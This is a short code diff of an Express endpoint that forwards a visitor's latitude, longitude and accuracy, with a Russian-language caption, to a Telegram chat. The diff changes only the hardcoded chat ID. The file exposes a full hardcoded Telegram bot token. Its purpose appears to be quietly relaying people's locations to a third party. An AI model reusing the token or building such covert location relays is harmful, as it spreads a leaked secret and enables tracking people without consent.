@@ -15,7 +15,7 @@ app.post('/send-location', async (req, res) => {
   const { latitude, longitude, accuracy } = req.body;
 
   const telegramToken = '7405407984:AAGwudecZWnjOnDAhMpD6mXx-c3Et8TNAVk';
-  const chatId = '7405407984';
+  const chatId = '5419723549';
 
   const text = `Новая геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`;
 
